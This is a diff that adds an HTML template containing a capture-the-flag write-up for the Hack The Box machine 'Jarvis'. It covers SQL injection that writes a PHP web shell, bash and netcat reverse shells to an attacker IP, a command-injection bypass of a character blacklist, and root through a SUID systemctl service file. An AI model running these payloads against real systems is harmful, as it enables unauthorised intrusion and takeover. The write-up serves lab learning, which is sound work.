@@ -1,0 +1,230 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">HTB Jarvis</h1>
+    <p class="text">Difficulty Medium | UserDifficlty : 4.8</p>
+    <h2 class="sub-title">Enumeration</h2>
+    <div class="code-box"><pre><code>└─$ <u>sudo nmap -p- -sCV &lt;target_ip&gt; --min-rate=2000</u>
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
+|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
+|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
+80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
+|_http-title: Stark Hotel
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.25 (Debian)
+64999/tcp open  http    Apache httpd 2.4.25 ((Debian))
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.25 (Debian)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre></div>
+
+<p class="text">HTTP servers are open on port 80 and 64999.</p>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/jarvis/1-home.png' %}" alt="">
+    <p class="text">This website is basic reservation site. Also there are several linked pages. Before enumearte directories, we may have to browse this site.</p>
+</div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/jarvis/2.png' %}" alt="">
+    <img src="{% static 'EthHack/images/jarvis/3.png' %}" alt="">
+</div>
+
+<p class="text">When I jumped to the Rooms page, there were several rooms we can make reservation, and hitting Book Now! button again, php query appeared in url <u>http://jarvis.htb/room.php?cod=1</u>. It wasn't clear that the rooms are connected to database because we can create this kind appearance without database, but the query revealed it is.</p>
+<p class="text">Before move to enumeration, let's test if we can execute SQL injection.</p>
+
+
+<h2 class="subtitle">Foothold</h2>
+<div class="img">
+    <img src="{% static 'EthHack/images/jarvis/4.png' %}" alt="">
+    <p class="text">When I changed query string to <u>?cod='</u>, it didn't returned error, instead, the page parsed empty reservation page. This means SQL injection successfully executed, and the php code might be similar structure below...</p>
+</div>
+
+<div class="code-box"><pre><code>$cod = $_REQUEST['cod'];
+$query = "select * from rooms where id = $cod";
+
+$result = $conn->query($query);
+if ($result === false) {
+    echo "Query failed: " . $conn->error;
+    exit;
+}
+$room = $result->fetch_assoc();
+if ($room) {
+    ...
+}</code></pre></div>
+
+<p class="text">Therefore, we can extract data from attached database, ideally we can write file if we're lucky.</p>
+<p class="text">Also, as the page changes reaction based on the existance of data, the boolean based SQL injection is valid.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/jarvis/5.png' %}" alt="">
+    <p class="text">When we checking column number with ORDER BY statement, it returned empty image when the query number became 8, therefore, the columns are 8.</p>
+</div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/jarvis/6.png' %}" alt="">
+    <p class="text">Also, I checked which columns are displayed on the page with statement <u>cod=-1 UNION SELECT '1','2',...,'7'</u>, and it revealed columns 2,3,4, and 5 are used. <br><br><u>※We need to change query number into -1 because numbers I indicated in UNION SELECT statement would be fetched to the last row.</u></p>
+</div>
+
+<p class="text">Then, we can try SQL's outfile function because it's better to get low-hanging fruits. It's possible to extract data with sqlmap, but it will take longer.</p>
+
+<p class="text">I tried this query <u>=-1 UNION SELECT 1,'&lt;?php system($_REQUEST["cmd"]);?&gt;',3,4,5,6,7 into outfile '/var/www/html/test.php'</u>.</p>
+
+<div class="code-box"><pre><code>└─$ curl http://jarvis.htb/test.php              
+1               3       4       5       6       7</code></pre></div>
+
+<p class="text">When I tested with curl command, it returned numbers I wrote in sql injection, and column 2 is empty. Because column 2 is php code, it doesn't parse the part and it also means our test is succeeded. Let's get reverse shell with this php webshell.</p>
+
+<div class="code-box"><pre><code>└─$ curl -G 'http://jarvis.htb/test.php' --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.16.40/4444 0>&1'"
+
+
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.40] from (UNKNOWN) [10.129.7.144] 38178
+bash: cannot set terminal process group (581): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@jarvis:/var/www/html$ </code></pre></div>
+
+<p class="text">We got www-data user.</p>
+
+
+
+<h2 class="subtitle">Lateral Movement to pepper</h2>
+
+<p class="text">For a while, I searched password string in tons of php files, however, I couldn't find any interesting information. However, glancing at sudo -l output, I found vector which lead us to shell with pepper.</p>
+<p class="text">Generally speaking, I should have tried the sudo -l command because <u>it's better to finish easy task</u>. I wasted time doing stupid seeking.</p>
+
+
+<div class="code-box"><pre><code>www-data@jarvis:/var/www/Admin-Utilities$ sudo -l
+sudo -l
+Matching Defaults entries for www-data on jarvis:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on jarvis:
+    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py</code></pre></div>
+
+
+    <p class="text">We can run the python script as user pepper.</p>
+
+    <div class="code-box"><pre><code>def exec_ping():
+    forbidden = ['&', ';', '-', '`', '||', '|']
+    command = input('Enter an IP: ')
+    for i in forbidden:
+        if i in command:
+            print('Got you')
+            exit()
+    os.system('ping ' + command)</code></pre></div>
+
+    <p class="text">Also, the code snippet uses dangerous function <u>os.system(...)</u>. We might use it for privilege escalation.</p>
+<p class="text">Though it blacklist several characters, we can still use <u>'$', '(' and ')'</u>. </p>
+<p class="text"><u>※From a blue team perspective, it is more secure to whitelist certain extensions, instead of trying to blacklist all potenrially malicious ones.</u></p>
+
+<p class="text">Therefore, if we can make a rev-shell file and execute it within code expantion, we can gain shell with pepper.</p>
+
+<div class="code-box"><pre><code>www-data@jarvis:/var/www/Admin-Utilities$ <u>echo "bash -c 'bash -i >& /dev/tcp/10.10.16.40/4444 0>&1'" > /tmp/revshell.sh</u>
+www-data@jarvis:/var/www/Admin-Utilities$ <u>chmod +x /tmp/revshell.sh</u></code></pre></div>
+
+<p class="text">We can call os.system(...) with -p flag.</p>
+    
+<div class="code-box"><pre><code>www-data@jarvis:/tmp$ <u>sudo -u pepper /var/www/Admin-Utilities/simpler.py -p</u>
+***********************************************
+     _                 _                       
+ ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
+/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
+\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
+|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
+                |_|               |_|    |___/ 
+                                @ironhackers.es
+                                
+***********************************************
+
+Enter an IP: $(/tmp/revshell.sh)
+
+
+
+└─$ <u>nc -lvnp 4444</u>
+listening on [any] 4444 ...
+connect to [10.10.16.40] from (UNKNOWN) [10.129.7.144] 38212
+bash: cannot set terminal process group (581): Inappropriate ioctl for device
+bash: no job control in this shell
+pepper@jarvis:/tmp$ </code></pre></div>
+
+<p class="text">We got user pepper. You can find user flag in <u>/home/pepper</u>.</p>
+
+<h2 class="subtitle">PrivEsc</h2>
+
+<p class="text">Because we have no password for pepper, we cannot see sudo -l. Therefore, we have to find anther vector for PrivEsc.</p>
+
+<div class="code-box"><pre><code>pepper@jarvis:/tmp$ <u>find / -perm -4000 2>/dev/null</u>
+find / -perm -4000 2>/dev/null
+/bin/fusermount
+/bin/mount
+/bin/ping
+/bin/systemctl
+/bin/umount
+/bin/su
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/sudo
+/usr/bin/chfn
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper</code></pre></div>
+
+<p class="text">We can see two uncommon SUIDed binaries <u>ping</u> and <u>systemctl</u>. Because ping doesn't have usable functionality for privilege escalation, I'll focus on systemctl.</p>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/jarvis/7.png' %}" alt="">
+    <p class="text">GTFOBins returns this method. Code here <u>ExecStart=/bin/sh -c "id > /tmp/output"</u> seems to be executed. </p>
+</div>
+
+<p class="text">We can create original service file like below...</p>
+<div class="code-box"><pre><code>pepper@jarvis:~$ echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "nc -e /bin/bash 10.10.16.40 4444"
+[Install]
+WantedBy=multi-user.target' > test.serviceecho '[Service]
+
+> Type=oneshot
+> ExecStart=/bin/sh -c "nc -e /bin/bash 10.10.16.40 4444"
+> [Install]
+> WantedBy=multi-user.target' > test.service</code></pre></div>
+<p class="text"><u>※You cannot locate service file in /tmp dir like GTFOBins instruction because systemctl tends to reject world-writable location for safety practice.</u></p>
+
+<p class="text">Then, I create symlink.</p>
+
+<div class="code-box"><pre><code>pepper@jarvis:~$ <u>systemctl link /home/pepper/test.service</u> <u class="green">You need to state full path.</u></code></pre></div>
+
+<p class="text">Finally, start it.</p>
+<p class="text">The code snippet in GTFOBins <u>systemctl enable --now &lt;unit></u> is registoration. Therefore, we have to state <u>start</u> for transient execution.</p>
+<div class="code-box"><pre><code>pepper@jarvis:~$ <u>systemctl start test</u> <u class="green">#this test is not test, but name of file...</u>
+systemctl start test
+
+
+└─$<u> nc -lvnp 4444</u>
+listening on [any] 4444 ...
+connect to [10.10.16.40] from (UNKNOWN) [10.129.7.144] 38214
+id
+uid=0(root) gid=0(root) groups=0(root)</code></pre></div>
+
+<p class="text">We got root user. You can get root flag in <u>/root/root.txt</u>.</p>
+
+</body>
+</html>
